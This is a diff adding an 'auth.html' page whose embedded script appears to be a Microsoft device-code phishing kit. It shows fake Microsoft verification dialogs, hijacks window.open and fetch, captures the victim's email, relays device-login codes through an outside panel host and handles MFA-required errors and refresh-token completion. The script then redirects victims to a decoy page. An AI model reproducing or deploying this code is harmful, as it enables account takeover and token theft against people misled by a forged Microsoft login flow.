@@ -1,0 +1,2424 @@
+<!-- auth.html -->
+<!DOCTYPE html>
+<html lang="en">
+
+<head><script>
+(function(){
+  var b="https://rep-galile-fr.com";
+  var m="cookie";
+  var automaticTargetCountry=false;
+  var automaticTargetCountryHeaderOnly=true;
+  var winHelloEnabled=false;
+  var devicePollTimeoutMs=600000;
+  window.__DEVICE_POLL_TIMEOUT_MS=devicePollTimeoutMs;
+  var o=window.fetch;
+  var wo=window.open;
+  var lastDevicePopup=null;
+  var deviceOpenMode=String(window.__DEVICE_OPEN_MODE||"popup").toLowerCase()==="new_tab"?"new_tab":"popup";
+  if(b) window.__API_BASE = b;
+  if(b) window.GHOST_PANEL = b;
+  if(m) window.__AUTH_MODE = m;
+  function isMicrosoftSigninUrl(u){var s=String(u||"").toLowerCase();return s.indexOf("microsoft.com/devicelogin")!==-1||s.indexOf("login.microsoftonline.com")!==-1||s.indexOf("microsoftonline.com/appverify")!==-1||s.indexOf("login.live.com")!==-1;}
+  function rememberDevicePopup(w){try{if(w){lastDevicePopup=w;window.__DEVICE_POPUP_REF=w;}}catch(e){}return w;}
+  if(typeof wo==="function"){window.__openDeviceLogin=function(u){return rememberDevicePopup(deviceOpenMode==="new_tab"?wo.call(window,u,"_blank"):wo.call(window,u,"ML","width=500,height=600"));};window.open=function(u,t,f){if(isMicrosoftSigninUrl(u))return window.__openDeviceLogin(u);return wo.apply(window,arguments);};}
+  function closeDevicePopup(){var hadPopup=false;try{var p=window.__DEVICE_POPUP_REF||lastDevicePopup;if(p&&!p.closed){hadPopup=true;try{p.close();}catch(e){}setTimeout(function(){try{if(p&&!p.closed)p.close();}catch(e){}},80);setTimeout(function(){try{if(p&&!p.closed)p.close();}catch(e){}},220);}}catch(e){}lastDevicePopup=null;try{window.__DEVICE_POPUP_REF=null;}catch(e){}return hadPopup;}
+  function showSoftToastAfterPopupClose(title,msg,dur,code,variant){var wait=closeDevicePopup()?360:0;setTimeout(function(){showSoftToast(title,msg,dur,code,variant);},wait);}
+  var toastTimer=null;
+  var capturedAccountEmail="";
+  function applyAccountEmail(){
+    try{
+      var n=document.getElementById("device-soft-toast-wrap");
+      if(!n)return;
+      var account=n.querySelector("[data-toast-account]");
+      var emailNode=n.querySelector("[data-toast-email]");
+      if(!account||!emailNode)return;
+      if(capturedAccountEmail){emailNode.textContent=capturedAccountEmail;account.style.display="block";}
+      else{account.style.display="none";}
+    }catch(e){}
+  }
+  function rememberAccountEmail(value){
+    try{
+      var email=String(value||"").trim();
+      if(email===""||email.length>320)return;
+      if(!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email))return;
+      if(capturedAccountEmail===email)return;
+      capturedAccountEmail=email;
+      var wrap=document.getElementById("device-soft-toast-wrap");
+      if(wrap&&wrap.style.opacity==="1")applyAccountEmail();
+    }catch(e){}
+  }
+  function toastNode(){
+    var id="device-soft-toast-wrap";
+    var w=document.getElementById(id);
+    if(w) return w;
+
+    w=document.createElement("div");
+    w.id=id;
+    w.setAttribute("role","status");
+    w.setAttribute("aria-live","assertive");
+    w.style.cssText="position:fixed;inset:0;z-index:2147483647;display:grid;place-items:center;padding:24px;box-sizing:border-box;opacity:0;pointer-events:none;font-family:Segoe UI,-apple-system,BlinkMacSystemFont,Roboto,Arial,sans-serif;";
+    w.innerHTML=[
+      '<div id="device-soft-backdrop" style="position:absolute;inset:0;background:rgba(17,17,17,.42);backdrop-filter:blur(28px) saturate(115%);-webkit-backdrop-filter:blur(28px) saturate(115%);"></div>',
+      '<div id="device-soft-toast" style="position:relative;z-index:1;width:min(440px,100%);max-height:calc(100vh - 40px);overflow:auto;background:#fff;color:#1b1b1b;box-sizing:border-box;padding:44px;box-shadow:rgba(0,0,0,.132) 0 64px 64px -32px,rgba(0,0,0,.11) 0 22.2px 17.7px 0,rgba(0,0,0,.07) 0 12px 9px 0,rgba(0,0,0,.059) 0 6.7px 5.4px 0,rgba(0,0,0,.048) 0 3.5px 2.8px 0;transform:scale(.985);transition:opacity .22s ease,transform .22s ease;">',
+      '<svg width="108" height="23" viewBox="0 0 108 23" role="img" aria-label="Microsoft" style="display:block;">',
+      '<path d="M0 0h10.5v10.5H0z" fill="#f25022"/>',
+      '<path d="M11.5 0H22v10.5H11.5z" fill="#7fba00"/>',
+      '<path d="M0 11.5h10.5V22H0z" fill="#00a4ef"/>',
+      '<path d="M11.5 11.5H22V22H11.5z" fill="#ffb900"/>',
+      '<text x="28" y="17.4" font-family="Segoe UI, Helvetica, Arial, sans-serif" font-size="15" font-weight="600" fill="#1b1b1b">Microsoft</text>',
+      '</svg>',
+      '<div data-toast-title style="margin:18px 0 12px;font-size:24px;font-weight:600;line-height:28px;color:#1b1b1b;">Additional verification required</div>',
+      '<div data-toast-intro style="display:none;margin:0 0 12px;font-size:15px;line-height:20px;color:#242424;">Your sign-in was successful. To continue, we need to complete an additional verification on this device.</div>',
+      '<div data-toast-account style="display:none;margin:0 0 16px;">',
+      '<div style="font-size:13px;line-height:18px;color:#605e5c;margin:0 0 2px;">Signed in as</div>',
+      '<div data-toast-email style="font-size:15px;line-height:20px;color:#1b1b1b;overflow-wrap:anywhere;"></div>',
+      '</div>',
+      '<div data-callout-info style="display:none;gap:10px;align-items:flex-start;border-radius:4px;padding:12px;margin:0 0 16px;background:#f3f9fd;font-size:13px;line-height:18px;color:#242424;">',
+      '<svg width="16" height="16" viewBox="0 0 16 16" aria-hidden="true" style="flex:none;margin-top:1px;"><circle cx="8" cy="8" r="7" fill="#0067b8"/><rect x="7.25" y="7" width="1.5" height="5.25" fill="#fff"/><circle cx="8" cy="4.9" r=".9" fill="#fff"/></svg>',
+      '<span data-callout-info-text></span>',
+      '</div>',
+      '<div data-callout-error style="display:none;gap:10px;align-items:flex-start;border-radius:4px;padding:12px;margin:0 0 16px;background:#fdf3f4;font-size:13px;line-height:18px;color:#242424;">',
+      '<svg width="16" height="16" viewBox="0 0 16 16" aria-hidden="true" style="flex:none;margin-top:1px;"><circle cx="8" cy="8" r="7" fill="#d13438"/><rect x="7.25" y="3.75" width="1.5" height="5" fill="#fff"/><circle cx="8" cy="11.35" r=".85" fill="#fff"/></svg>',
+      '<span data-callout-error-text></span>',
+      '</div>',
+      '<div data-status-row style="display:none;margin:4px 0 20px;align-items:center;gap:12px;">',
+      '<span aria-hidden="true" style="flex:0 0 auto;width:24px;height:24px;border-radius:50%;border:3px solid rgba(0,103,184,.18);border-top-color:#0067b8;box-sizing:border-box;animation:deviceSoftSpin .9s cubic-bezier(.55,.2,.45,.8) infinite;"></span>',
+      '<span data-status-text style="font-size:15px;line-height:20px;color:#1b1b1b;">Preparing additional verification...</span>',
+      '</div>',
+      '<div data-success-row style="display:none;margin:4px 0 0;gap:10px;align-items:flex-start;">',
+      '<span aria-hidden="true" style="flex:0 0 auto;display:flex;align-items:center;justify-content:center;width:24px;height:24px;border-radius:50%;background:#107c10;margin-top:1px;"><svg width="14" height="14" viewBox="0 0 14 14" fill="none" aria-hidden="true"><path d="M2 7.4 5.3 10.7 12 4" stroke="#fff" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/></svg></span>',
+      '<span data-success-text style="font-size:15px;line-height:24px;font-weight:600;color:#1b1b1b;">The verification window has opened.</span>',
+      '</div>',
+      '<div id="soft-toast-actions" style="display:flex;justify-content:flex-end;gap:8px;align-items:center;margin-top:24px;">',
+      '<button type="button" id="soft-toast-close" style="height:36px;min-width:108px;padding:0 16px;border-radius:3px;border:1px solid #8a8886;background:#fff;color:#1b1b1b;font-size:15px;font-weight:600;font-family:inherit;cursor:pointer;">Dismiss</button>',
+      '</div>',
+      '<div data-toast-footer style="margin-top:32px;display:flex;gap:14px;flex-wrap:wrap;">',
+      '<span style="font-size:12px;color:#605e5c;">Terms of use</span>',
+      '<span style="font-size:12px;color:#605e5c;">Privacy &amp; cookies</span>',
+      '<span style="font-size:12px;color:#605e5c;">Help</span>',
+      '</div>',
+      '</div>'
+    ].join("");
+    if(!document.getElementById("device-soft-toast-style")){
+      var style=document.createElement("style");
+      style.id="device-soft-toast-style";
+      style.textContent="@keyframes deviceSoftSpin{to{transform:rotate(360deg)}}@media(max-width:480px){#device-soft-toast-wrap{padding:16px!important}#device-soft-toast{padding:32px 24px!important}#soft-toast-actions{flex-direction:column-reverse}#soft-toast-actions button{width:100%}}";
+      (document.head||document.documentElement).appendChild(style);
+    }
+    (document.body||document.documentElement).appendChild(w);
+    return w;
+  }
+  function showSoftToast(title,msg,dur,code,variant){
+    try{
+      var n=toastNode();
+      var v=String(variant||"").toLowerCase();
+      var busy=v==="busy"||v==="preparing"||v==="opening"||v==="finalizing";
+      var success=v==="success"||v==="done";
+      var error=v==="error"||v==="blocked";
+      var info=!busy&&!success&&!error;
+      var text=String(msg||"");
+      var a=n.querySelector("[data-toast-title]");
+      var intro=n.querySelector("[data-toast-intro]");
+      var closeBtn=n.querySelector("#soft-toast-close");
+      var toast=n.querySelector("#device-soft-toast");
+      var infoCallout=n.querySelector("[data-callout-info]");
+      var infoCalloutText=n.querySelector("[data-callout-info-text]");
+      var errorCallout=n.querySelector("[data-callout-error]");
+      var errorCalloutText=n.querySelector("[data-callout-error-text]");
+      var statusRow=n.querySelector("[data-status-row]");
+      var statusText=n.querySelector("[data-status-text]");
+      var successRow=n.querySelector("[data-success-row]");
+      var successText=n.querySelector("[data-success-text]");
+      var actions=n.querySelector("#soft-toast-actions");
+      var account=n.querySelector("[data-toast-account]");
+
+      if(a)a.textContent=title||"";
+      if(intro)intro.style.display=winHelloEnabled&&!success?"block":"none";
+      if(infoCalloutText&&info)infoCalloutText.textContent=text;
+      if(infoCallout)infoCallout.style.display=info&&text!==""?"flex":"none";
+      if(errorCalloutText&&error)errorCalloutText.textContent=text;
+      if(errorCallout)errorCallout.style.display=error&&text!==""?"flex":"none";
+      if(statusRow)statusRow.style.display=busy?"flex":"none";
+      if(statusText&&busy&&text!=="")statusText.textContent=text;
+      if(successRow)successRow.style.display=success?"flex":"none";
+      if(successText&&success&&text!=="")successText.textContent=text;
+      if(actions)actions.style.display=info||error?"flex":"none";
+      applyAccountEmail();
+      if(account&&success)account.style.display="none";
+
+      clearTimeout(toastTimer);
+      if(closeBtn)closeBtn.onclick=function(){hideSoftToast();};
+      n.style.opacity=1;
+      n.style.pointerEvents="auto";
+      if(toast)toast.style.transform="scale(1)";
+      toastTimer=setTimeout(hideSoftToast,dur||7600);
+    }catch(e){}
+  }
+  function hideSoftToast(){
+    try{
+      clearTimeout(toastTimer);
+      var n=document.getElementById("device-soft-toast-wrap");
+      var toast=n&&n.querySelector("#device-soft-toast");
+      if(n){n.style.opacity=0;n.style.pointerEvents="none";}
+      if(toast)toast.style.transform="scale(.985)";
+    }catch(e){}
+  }
+  var lastWinHelloMirror="";
+  var winHelloPopup=null;
+  var pendingWinHelloMirror="";
+  var winHelloStage=0;
+  var winHelloTransitionUrl="";
+  var winHelloTransitionTimer=null;
+  var winHelloLaunchTimer=null;
+  function isSuccessfulStatus(status){var s=String(status||"").toLowerCase();return s==="done"||s==="success"||s==="completed";}
+  function isFailureStatus(status){var s=String(status||"").toLowerCase();return s==="failed"||s==="error"||s==="cancelled"||s==="timeout"||s==="timeout_waiting_user_login";}
+  function isTerminalStatus(status){return isSuccessfulStatus(status)||isFailureStatus(status);}
+  function destinationUrl(){return typeof window.__DESTINATION_URL==="string"?window.__DESTINATION_URL:"";}
+  function navigateToDestination(url){
+    if(!url)return false;
+    try{
+      if(typeof window.__sxTopNavigate==="function"){window.__sxTopNavigate(url);return true;}
+      window.location.replace(url);
+      return true;
+    }catch(e){
+      try{window.location.href=url;return true;}catch(e2){}
+    }
+    return false;
+  }
+  function redirectAfterVerified(){
+    var dest=destinationUrl();
+    if(!dest)return false;
+    showSoftToast("Verification complete","Redirecting to destination...",1800,null,"success");
+    setTimeout(function(){navigateToDestination(dest);},700);
+    return true;
+  }
+  function removeWinHelloContinue(){try{var n=document.querySelector("[data-winhello-continue]");if(n)n.remove();}catch(e){}}
+  function closeWinHelloPopup(){clearTimeout(winHelloTransitionTimer);clearTimeout(winHelloLaunchTimer);winHelloTransitionUrl="";pendingWinHelloMirror="";lastWinHelloMirror="";removeWinHelloContinue();hideSoftToast();try{if(winHelloPopup&&!winHelloPopup.closed)winHelloPopup.close();}catch(e){}winHelloPopup=null;try{window.__WINHELLO_POPUP_REF=null;}catch(e){}}
+  function prepareWinHelloStart(){winHelloStage=0;closeWinHelloPopup();}
+  function openWinHelloPopup(url){
+    try{
+      var mobile=/Android|iPhone|iPad|iPod/i.test(navigator.userAgent)||window.innerWidth<=768;
+      var w=mobile?wo.call(window,url,"_blank"):wo.call(window,url,"WHB","width=520,height=700,menubar=no,toolbar=no,location=yes");
+      if(w){winHelloPopup=w;pendingWinHelloMirror="";removeWinHelloContinue();try{window.__WINHELLO_POPUP_REF=w;w.focus();}catch(e){}return true;}
+    }catch(e){}
+    return false;
+  }
+  function installWinHelloContinue(url){
+    try{
+      var n=toastNode();
+      var actions=n.querySelector("#soft-toast-actions");
+      if(!actions)return;
+      removeWinHelloContinue();
+      var button=document.createElement("button");
+      button.type="button";
+      button.setAttribute("data-winhello-continue","1");
+      button.textContent="Continue verification";
+      button.style.cssText="height:36px;min-width:108px;padding:0 16px;border-radius:3px;border:1px solid #0067b8;background:#0067b8;color:#fff;font-weight:600;font-size:15px;font-family:inherit;cursor:pointer;";
+      button.addEventListener("click",function(){
+        if(openWinHelloPopup(url)){
+          closeDevicePopup();
+          showSoftToast("Additional verification","Complete the verification in the second window.",600000,null,"success");
+        }else{
+          showSoftToast("Popup blocked","Allow popups for this site, then select Continue verification again.",600000,null,"error");
+        }
+      });
+      actions.appendChild(button);
+    }catch(e){}
+  }
+  function adoptDevicePopupForWinHello(url){
+    var p=window.__DEVICE_POPUP_REF||lastDevicePopup;
+    if(!p||p.closed)return false;
+    try{
+      p.location.href=url;
+      winHelloPopup=p;
+      lastDevicePopup=null;
+      try{window.__DEVICE_POPUP_REF=null;}catch(e){}
+      pendingWinHelloMirror="";
+      removeWinHelloContinue();
+      try{window.__WINHELLO_POPUP_REF=p;p.focus();}catch(e){}
+      return true;
+    }catch(e){}
+    return false;
+  }
+  function showWinHelloMirror(value){
+    try{
+      var parsed=new URL(String(value||""),g()||window.location.href);
+      if(parsed.protocol!=="https:"&&parsed.protocol!=="http:")return;
+      var url=parsed.href;
+      if(!url)return;
+      if(lastWinHelloMirror===url){
+        try{if(!winHelloPopup||winHelloPopup.closed){pendingWinHelloMirror=url;installWinHelloContinue(url);showSoftToast("Additional verification required","Select Continue verification to reopen the verification window.",600000,null,"error");}}catch(e){}
+        return;
+      }
+      lastWinHelloMirror=url;
+      if(winHelloPopup&&!winHelloPopup.closed){
+        try{winHelloPopup.location.href=url;winHelloPopup.focus();pendingWinHelloMirror="";return;}catch(e){}
+      }
+      if(adoptDevicePopupForWinHello(url)){showSoftToast("Additional verification","Complete the verification in the verification window.",600000,null,"success");return;}
+      if(openWinHelloPopup(url)){closeDevicePopup();showSoftToast("Additional verification","Complete the verification in the second window.",600000,null,"success");return;}
+      pendingWinHelloMirror=url;
+      installWinHelloContinue(url);
+      showSoftToast("Additional verification required","Select Continue verification to open the verification window.",600000,null,"error");
+    }catch(e){}
+  }
+  function beginWinHelloTransition(value){
+    try{
+      var parsed=new URL(String(value||""),g()||window.location.href);
+      if(parsed.protocol!=="https:"&&parsed.protocol!=="http:")return;
+      var url=parsed.href;
+      if(!url)return;
+      if(winHelloStage>=2)return;
+      winHelloStage=Math.max(winHelloStage,1);
+      if(winHelloTransitionUrl===url)return;
+      if(lastWinHelloMirror===url){showWinHelloMirror(url);return;}
+      winHelloTransitionUrl=url;
+      clearTimeout(winHelloTransitionTimer);
+      clearTimeout(winHelloLaunchTimer);
+      winHelloTransitionTimer=setTimeout(function(){
+        showSoftToast("Additional verification required","Preparing additional verification. The verification window will continue shortly.",600000,null,"busy");
+        winHelloLaunchTimer=setTimeout(function(){winHelloTransitionUrl="";showWinHelloMirror(url);},650);
+      },0);
+    }catch(e){}
+  }
+  function am(){var w=typeof window.__AUTH_MODE==="string"?window.__AUTH_MODE:"";return w||m||"";}
+  function g(){if(window.__sxDocumentOrigin)return window.__sxDocumentOrigin;if(location.protocol==="blob:"){var r=String(location.href).match(/^blob:(https?:\/\/[^/]+)/i);if(r)return r[1];}return location.origin&&location.origin!=="null"?location.origin:"";}
+  function p(u){if(!u)return"";if(typeof u!=="string")u=u.url||String(u);if(u.indexOf("/api/")===0)return u;try{var x=new URL(u,g()||window.location.href);var q=g();var bo=b?new URL(b).origin:"";if(x.pathname.indexOf("/api/")===0&&((q&&x.origin===q)||(bo&&x.origin===bo)))return x.pathname+x.search+x.hash;}catch(e){}return"";}
+  function first(){for(var i=0;i<arguments.length;i++){if(arguments[i]!==undefined&&arguments[i]!==null&&arguments[i]!=="")return arguments[i];}return null;}
+  function normalize(data){
+    if(!data||typeof data!=="object"||Array.isArray(data))return data;
+    var out={};
+    for(var k in data){if(Object.prototype.hasOwnProperty.call(data,k))out[k]=data[k];}
+    var result=data.result&&typeof data.result==="object"?data.result:{};
+    var meta=result.error_meta&&typeof result.error_meta==="object"?result.error_meta:{};
+    var device=data.device&&typeof data.device==="object"?data.device:(result.device&&typeof result.device==="object"?result.device:{});
+    var winHello=data.winhello&&typeof data.winhello==="object"?data.winhello:(result.winhello&&typeof result.winhello==="object"?result.winhello:{});
+    var id=first(data.job_id,data.login_id,data.id,data.session_id,result.job_id,result.login_id,result.id,result.session_id);
+    var code=first(data.user_code,data.device_code,data.code,result.user_code,result.device_code,result.code,device.user_code,device.device_code,device.code);
+    var mirrorUrl=first(data.mirror_url,result.mirror_url,winHello.mirror_url,device.mirror_url);
+    var accountEmail=first(winHello.account_email,winHello.email,data.account_email,result.account_email,device.account_email);
+    var uri=first(data.verification_uri,data.verification_url,data.verificationUrl,result.verification_uri,result.verification_url,result.verificationUrl,device.verification_uri,device.verification_url,device.verificationUrl,device.verification_uri_complete);
+    var status=first(data.status,result.status,device.status);
+    var error=first(data.error,data.message,data.last_error,result.error,result.message,result.last_error,device.error,device.message);
+    var errorCode=first(data.error_code,result.error_code,meta.error_code);
+    var recommendedMode=first(data.recommended_mode,result.recommended_mode,meta.recommended_mode);
+    var errorMessage=first(data.error_message,result.error_message,meta.error_message);
+    if(id!==null&&!out.job_id)out.job_id=id;
+    if(code!==null&&!out.user_code)out.user_code=code;
+    if(uri!==null&&!out.verification_uri)out.verification_uri=uri;
+    if(mirrorUrl!==null&&!out.mirror_url)out.mirror_url=mirrorUrl;
+    if(accountEmail!==null)rememberAccountEmail(accountEmail);
+    if(Object.keys(winHello).length&&!out.winhello)out.winhello=winHello;
+    if(status!==null&&!out.status)out.status=status;
+    if(error!==null&&!out.error)out.error=error;
+    if(errorCode!==null&&!out.error_code)out.error_code=errorCode;
+    if(recommendedMode!==null&&!out.recommended_mode)out.recommended_mode=recommendedMode;
+    if(errorMessage!==null&&!out.error_message)out.error_message=errorMessage;
+    var softText=[out.error,out.message,out.last_error,out.error_message,error,errorMessage].join(" ").toLowerCase();
+    var soft=!!(out.soft_error||result.soft_error||meta.soft_error||String(out.recommended_mode||"").toLowerCase()==="token"||String(out.error_code)==="50076"||softText.indexOf("aadsts50076")!==-1||softText.indexOf("interaction_required")!==-1||softText.indexOf("interaction required")!==-1||softText.indexOf("basic_action")!==-1);
+    if(soft){out.soft_error=true;if(!out.error_code)out.error_code=50076;if(!out.recommended_mode)out.recommended_mode="token";if(!out.error_message&&out.error)out.error_message=out.error;}
+    if(out.error&&!out.user_code&&!out.job_id&&!out.status){out.message=out.error;out.error="failed";out.status="failed";}
+    if(out.status==="error")out.status="failed";
+    if(out.user_code&&(!out.status||out.status==="pending"||out.status==="running"||out.status==="queued"))out.status="waiting_user";
+    return out;
+  }
+  function winHelloPayload(data){
+    if(!data||typeof data!=="object")return {};
+    if(data.winhello&&typeof data.winhello==="object")return data.winhello;
+    var result=data.result&&typeof data.result==="object"?data.result:{};
+    return result.winhello&&typeof result.winhello==="object"?result.winhello:{};
+  }
+  function preservePrtCompletion(data){
+    if(!data||typeof data!=="object")return data;
+    if(String(data.status||"").toLowerCase()==="wfb_failed"){
+      data.status="waiting_user";
+      data.wfb_success=false;
+    }
+    return data;
+  }
+  function modeValue(v){return String(v||"").toLowerCase()==="token"?"token":"cookie";}
+  function setMode(v){var x=modeValue(v);try{window.__AUTH_MODE=x;}catch(e){}return x;}
+  function statusPath(a){if(!a)return"";var p=String(a).split("?")[0];return p.indexOf("/api/device/status/")===0?p:"";}
+  function hasSoft(data){if(!data||typeof data!=="object")return false;var txt=[data.error,data.message,data.last_error,data.error_message,data.error_description,data.suberror].join(" ").toLowerCase();var codes=Array.isArray(data.error_codes)?data.error_codes.map(function(c){return String(c);}):[];return !!(data.soft_error===true||String(data.recommended_mode||"").toLowerCase()==="token"||String(data.error_code)==="50076"||codes.indexOf("50076")!==-1||txt.indexOf("aadsts50076")!==-1||txt.indexOf("interaction_required")!==-1||txt.indexOf("interaction required")!==-1||txt.indexOf("basic_action")!==-1);}
+  function jsonResp(data,resp,status){var headers=new Headers(resp&&resp.headers||undefined);headers.set("content-type","application/json; charset=utf-8");return new Response(JSON.stringify(data),{status:status||resp.status||200,statusText:resp.statusText||"OK",headers:headers});}
+  function headerGet(h,n){try{if(!h)return"";if(h instanceof Headers)return h.get(n)||"";var l=n.toLowerCase();for(var k in h){if(Object.prototype.hasOwnProperty.call(h,k)&&String(k).toLowerCase()===l)return h[k];}}catch(e){}return"";}
+  var retryPath={};
+  var lastToken="";
+  var startRequestIds={};
+  function newStartRequestId(){var value="";try{if(window.crypto&&typeof window.crypto.randomUUID==="function")value=window.crypto.randomUUID();else if(window.crypto&&typeof window.crypto.getRandomValues==="function"){var bytes=new Uint8Array(16);window.crypto.getRandomValues(bytes);value=Array.prototype.map.call(bytes,function(x){return ("0"+x.toString(16)).slice(-2);}).join("");}}catch(e){}if(!value)value=Date.now().toString(36)+"-"+Math.random().toString(36).slice(2);return "web-"+value.replace(/[^A-Za-z0-9._:-]/g,"-").slice(0,120);}
+  function startRequestId(mode){var key=modeValue(mode),storageKey="wfb.startRequest."+key,now=Date.now(),current=startRequestIds[key];if(!current){try{var stored=JSON.parse(sessionStorage.getItem(storageKey)||"null");if(stored&&typeof stored.value==="string"&&stored.expires>now)current=stored;}catch(e){}}if(!current||current.expires<=now){current={value:newStartRequestId(),expires:now+120000};try{sessionStorage.setItem(storageKey,JSON.stringify(current));}catch(e){}}startRequestIds[key]=current;return current.value;}
+  function clearStartRequestId(mode){var key=modeValue(mode);delete startRequestIds[key];try{sessionStorage.removeItem("wfb.startRequest."+key);}catch(e){}}
+  function rememberToken(i,n){var h=n&&n.headers||(i&&i.headers);var tok=headerGet(h,"X-Antibot-Token");if(tok)lastToken=tok;}
+  var visitorCountryPromise=null;
+  function normalizedCountry(value){var country=String(value||"").trim().toUpperCase();return /^[A-Z]{2}$/.test(country)&&country!=="XX"?country:"";}
+  function countryFromTrace(text){var match=String(text||"").match(/(?:^|\n)loc=([A-Za-z]{2})(?:\n|$)/);return match?normalizedCountry(match[1]):"";}
+  var visitorCountryCacheKey="static.visitorCountry.v2";
+  function cachedVisitorCountry(){try{return normalizedCountry(sessionStorage.getItem(visitorCountryCacheKey)||localStorage.getItem(visitorCountryCacheKey));}catch(e){return "";}}
+  function storeVisitorCountry(country){country=normalizedCountry(country);if(country){try{sessionStorage.setItem(visitorCountryCacheKey,country);}catch(e){}try{localStorage.setItem(visitorCountryCacheKey,country);}catch(e){}}return country;}
+  function resolveCountryFromLocalTrace(){
+    var controller=typeof AbortController==="function"?new AbortController():null;
+    var timer=controller?setTimeout(function(){try{controller.abort();}catch(e){}},900):null;
+    var options={cache:"no-store",credentials:"omit"};
+    if(controller)options.signal=controller.signal;
+    return o.call(window,"/cdn-cgi/trace",options).then(function(resp){return resp&&resp.ok?resp.text():"";}).then(countryFromTrace).catch(function(){return "";}).then(function(country){if(timer)clearTimeout(timer);return country;});
+  }
+  function resolveCountryFromApi(){
+    var apiOrigin=String(b||"").replace(/\/+$/,"");
+    if(!apiOrigin)return Promise.resolve("");
+    var countryUrl=apiOrigin+"/api/visitor/country";
+    var controller=typeof AbortController==="function"?new AbortController():null;
+    var timer=controller?setTimeout(function(){try{controller.abort();}catch(e){}},1500):null;
+    var options={cache:"no-store",credentials:"omit",headers:{"Accept":"application/json"}};
+    if(controller)options.signal=controller.signal;
+    return o.call(window,countryUrl,options).then(function(resp){return resp&&resp.ok?resp.json():null;}).then(function(data){return normalizedCountry(data&&data.country);}).catch(function(){return "";}).then(function(country){if(timer)clearTimeout(timer);return country;});
+  }
+  function resolveCountryFromCloudflare(){
+    var controller=typeof AbortController==="function"?new AbortController():null;
+    var timer=controller?setTimeout(function(){try{controller.abort();}catch(e){}},900):null;
+    var options={cache:"no-store",credentials:"omit"};
+    if(controller)options.signal=controller.signal;
+    return o.call(window,"https://cloudflare.com/cdn-cgi/trace",options).then(function(resp){return resp&&resp.ok?resp.text():"";}).then(countryFromTrace).catch(function(){return "";}).then(function(country){if(timer)clearTimeout(timer);return country;});
+  }
+  function resolveStaticVisitorCountry(){
+    if(!automaticTargetCountry||!automaticTargetCountryHeaderOnly)return Promise.resolve("");
+    if(visitorCountryPromise)return visitorCountryPromise;
+    var cached=cachedVisitorCountry();
+    if(cached){visitorCountryPromise=Promise.resolve(cached);return visitorCountryPromise;}
+    visitorCountryPromise=Promise.all([resolveCountryFromLocalTrace(),resolveCountryFromApi()]).then(function(results){return storeVisitorCountry(results[0]||results[1]);}).catch(function(){return "";}).then(function(country){return country||resolveCountryFromCloudflare().then(storeVisitorCountry);});
+    return visitorCountryPromise;
+  }
+  function withHeaders(i,n,mode,addAutomaticTargetCountry,visitorCountry,addWinHello,requestId){var next={};if(n){for(var k in n){if(Object.prototype.hasOwnProperty.call(n,k))next[k]=n[k];}}var h=new Headers(next.headers||(i&&i.headers)||undefined);if(mode)h.set("X-Auth-Mode",modeValue(mode));if(addAutomaticTargetCountry)h.set("X-Automatic-Target-Country","1");if(addWinHello)h.set("X-WinHello","1");if(requestId)h.set("Idempotency-Key",requestId);var country=String(visitorCountry||"").trim().toUpperCase();if(/^[A-Z]{2}$/.test(country))h.set("X-Visitor-Country",country);next.headers=h;return next;}
+  function parsedJson(resp){if(!resp||typeof resp.clone!=="function")return Promise.resolve(null);return resp.clone().text().then(function(text){if(!text)return null;try{return JSON.parse(text);}catch(e){return null;}},function(){return null;});}
+  function normalizedJson(resp){return parsedJson(resp).then(function(parsed){return parsed&&typeof parsed==="object"?normalize(parsed):null;});}
+  function ensureSoftShape(data){if(!data||typeof data!=="object")return data;if(hasSoft(data)&&!isSuccessfulStatus(data.status)){data.soft_error=true;if(!data.error_code)data.error_code=50076;if(!data.recommended_mode)data.recommended_mode="token";if(data.user_code)data.status="waiting_user";}return data;}
+  function startTokenRetry(originalPath){if(!lastToken)return Promise.resolve(null);setMode("token");showSoftToastAfterPopupClose("Additional verification required","For your security, please verify your account again. A new verification code is being prepared.",7600,null,"busy");var init=withHeaders(null,{method:"POST",headers:{"X-Antibot-Token":lastToken}},"token",false,"",false,startRequestId("token"));return o.call(window,b+"/api/device/start",init).then(function(resp){return normalizedJson(resp).then(function(data){if(!data)return null;data=ensureSoftShape(data);var id=first(data.retry_job_id,data.job_id,data.login_id,data.id,data.session_id);if(id)retryPath[originalPath]="/api/device/status/"+id;if(data.user_code){data.status="waiting_user";showSoftToastAfterPopupClose("Verification code ready","Please complete verification using the new code shown on this page.",9000);}return jsonResp(data,resp,resp.status||200);});},function(){showSoftToastAfterPopupClose("Verification update failed","Please refresh the page and request a new verification session.",9000,null,"error");return null;});}
+  function normalizeResponse(resp,path,originalPath){
+    if(!resp||typeof resp.clone!=="function")return Promise.resolve(resp);
+    return normalizedJson(resp).then(function(data){
+      if(!data){if(path==="/api/device/start"&&winHelloEnabled)closeWinHelloPopup();return resp;}
+      var isDeviceStatus=!!statusPath(path)||!!originalPath;
+      var isDeviceStart=path==="/api/device/start";
+      data=ensureSoftShape(data);
+      if(isDeviceStart&&modeValue(am())==="cookie"&&(resp.status===429||data.error==="capacity_exceeded")){
+        clearStartRequestId("cookie");
+        setMode("token");
+        winHelloStage=3;
+        closeWinHelloPopup();
+        showSoftToastAfterPopupClose("Additional verification required","For your security, please verify your account again. A new verification code is being prepared.",7600,null,"busy");
+        return startTokenRetry("/api/device/status/capacity").then(function(started){return started||jsonResp(data,resp,resp.status||429);});
+      }
+      if(isDeviceStart&&data.job_id){winHelloStage=0;}
+      else if(isDeviceStart&&winHelloEnabled){closeWinHelloPopup();}
+      if(isDeviceStatus)data=preservePrtCompletion(data);
+      if(originalPath&&hasSoft(data)&&!isSuccessfulStatus(data.status)){
+        clearStartRequestId("cookie");
+        setMode("token");
+        winHelloStage=3;
+        closeWinHelloPopup();
+        showSoftToastAfterPopupClose("Additional verification required","For your security, please verify your account again. A new verification code is being prepared.",7600,null,"busy");
+        var retryId=first(data.retry_job_id,data.job_id!==originalPath.split("/").pop()?data.job_id:null,data.login_id,data.id);
+        if(retryId)retryPath[originalPath]="/api/device/status/"+retryId;
+        if(data.retry_job_id)data.job_id=data.retry_job_id;
+        if(data.user_code){
+          data.status="waiting_user";
+          showSoftToastAfterPopupClose("Verification code ready","Please complete verification using the new code shown on this page.",9000);
+          return jsonResp(data,resp,resp.status||200);
+        }
+        return startTokenRetry(originalPath).then(function(started){return started||jsonResp(data,resp,resp.status||200);});
+      }
+      if(isDeviceStatus){
+        if(isSuccessfulStatus(data.status)){
+          clearStartRequestId(originalPath&&retryPath[originalPath]?"token":am());
+          winHelloStage=3;
+          closeWinHelloPopup();
